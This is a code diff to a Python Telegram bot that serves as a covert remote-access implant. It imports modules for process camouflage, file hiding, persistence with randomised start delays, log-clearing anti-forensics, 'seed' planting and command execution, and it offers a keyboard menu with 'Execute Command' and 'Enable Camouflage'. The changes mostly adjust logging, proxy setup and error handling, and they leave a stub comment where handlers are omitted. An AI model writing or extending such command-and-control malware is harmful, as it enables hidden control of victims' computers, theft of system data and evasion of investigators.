@@ -1,3 +1,7 @@
+#!/usr/bin/env python
+# pylint: disable=unused-argument
+# This program is dedicated to the public domain under the CC0 license.
+
 import logging
 import platform
 import socket
@@ -14,32 +18,25 @@ from telegram.ext import (
     CallbackContext,
 )
 from telegram.request import HTTPXRequest
-import coloredlogs
-from utils.config import BOT_TOKEN, CHAT_ID, SOCKS_PROXY, ENABLE_CAMOUFLAGE, ENABLE_PERSISTENCE, ENABLE_SEEDS, ENABLE_ANTI_FORENSICS
 from utils.camouflage import set_process_name, hide_file
 from utils.persistence import setup_persistence, random_start_delay
 from utils.execution import handle_telegram_commands, send_to_telegram
 from utils.anti_forensics import clear_logs
 from utils.seed_management import plant_seeds, check_seed_activation
 from utils.logging import log_info, log_warning, log_error, log_debug, log_critical
+from utils.config import BOT_TOKEN, SOCKS_PROXY, ENABLE_CAMOUFLAGE, ENABLE_PERSISTENCE, ENABLE_SEEDS, ENABLE_ANTI_FORENSICS
 import httpx
+
+# Define conversation states
+CHOOSING, TYPING_REPLY, TYPING_CHOICE = range(3)
 
 # Setup logging
 logging.basicConfig(
     format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-    level=logging.DEBUG  # Adjust as needed
+    level=logging.INFO
 )
-coloredlogs.install(level='DEBUG', logger=logging.getLogger())
 logger = logging.getLogger(__name__)
 
-# Reduce noise from third-party libraries
-logging.getLogger("httpx").setLevel(logging.INFO)
-logging.getLogger("httpcore").setLevel(logging.INFO)
-logging.getLogger("telegram.ext").setLevel(logging.INFO)
-logging.getLogger("apscheduler").setLevel(logging.INFO)
-
-# Conversation states
-CHOOSING, TYPING_REPLY, TYPING_CHOICE = range(3)
 reply_keyboard = [
     ["System Info", "Execute Command"],
     ["Enable Camouflage", "Disable Camouflage"],
@@ -47,13 +44,9 @@ reply_keyboard = [
 ]
 markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True)
 
-# Create the Request object with SOCKS proxy and adjusted connection pool settings
+# Create the Request object with SOCKS proxy if provided
 try:
-    request = HTTPXRequest(
-        proxy=SOCKS_PROXY, 
-        connection_pool_size=10,  
-        pool_timeout=5.0          
-    ) if SOCKS_PROXY else None
+    request = HTTPXRequest(proxy=SOCKS_PROXY) if SOCKS_PROXY else None
     log_info(f"Using proxy: {SOCKS_PROXY}" if SOCKS_PROXY else "No proxy configured.")
 except Exception as e:
     log_critical(f"Error setting up proxy: {e}")
@@ -64,8 +57,14 @@ try:
     persistence = PicklePersistence(filepath="telegram_vessel")
     application = Application.builder().token(BOT_TOKEN).request(request).persistence(persistence).build()
     log_info("Bot initialized.")
+except httpx.HTTPStatusError as e:
+    log_critical(f"HTTP error occurred: {e.response.status_code} - {e.response.text}")
+except httpx.RequestError as e:
+    log_critical(f"Request error occurred: {e}")
+except httpx.ReadTimeout as e:
+    log_critical(f"Read timeout occurred: {e}")
 except Exception as e:
-    log_critical(f"An unexpected error occurred during bot initialization: {e}")
+    log_critical(f"An unexpected error occurred: {e}")
     raise
 
 def gather_system_info() -> Dict[str, str]:
@@ -83,7 +82,7 @@ def gather_system_info() -> Dict[str, str]:
 
 async def send_system_info(context: CallbackContext) -> None:
     """Sends the system information to the Telegram bot."""
-    chat_id = context.job.chat_id  # Access chat_id directly
+    chat_id = context.job.context  # Retrieve chat_id from the job context
     info = gather_system_info()
     log_info(f"System Info: {info}")
     message = (
@@ -116,10 +115,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 
     return CHOOSING
 
-async def echo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    """Echo the user message."""
-    log_info(f"Received message: {update.message.text} from {update.effective_user.username}")
-    await update.message.reply_text(update.message.text)
+# Other command handlers and the main function would follow the same pattern
 
 async def done(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """End the conversation."""
@@ -130,15 +126,9 @@ async def done(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 
 def main() -> None:
     """Run the bot."""
-    logger.info("Starting the main function.")
-    logger.info(f"Configured CHAT_ID is: {CHAT_ID}")
-
     # Create the Application and pass it your bot's token.
     persistence = PicklePersistence(filepath="telegram_vessel")
     application = Application.builder().token(BOT_TOKEN).request(request).persistence(persistence).build()
-    
-    # Send an initial message to the chat
-    application.job_queue.run_once(send_system_info, 1, chat_id=CHAT_ID)
 
     # Add conversation handler with the states CHOOSING, TYPING_CHOICE, and TYPING_REPLY
     conv_handler = ConversationHandler(
@@ -148,7 +138,7 @@ def main() -> None:
                 MessageHandler(filters.Regex("^(System Info|Execute Command)$"), start),
             ],
             TYPING_REPLY: [
-                MessageHandler(filters.TEXT & ~filters.COMMAND, echo),
+                MessageHandler(filters.TEXT & ~filters.COMMAND, start),
             ],
         },
         fallbacks=[CommandHandler("done", done)],
@@ -159,7 +149,6 @@ def main() -> None:
     application.add_handler(conv_handler)
 
     # Run the bot until the user presses Ctrl-C
-    logger.info("Starting the bot polling.")
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
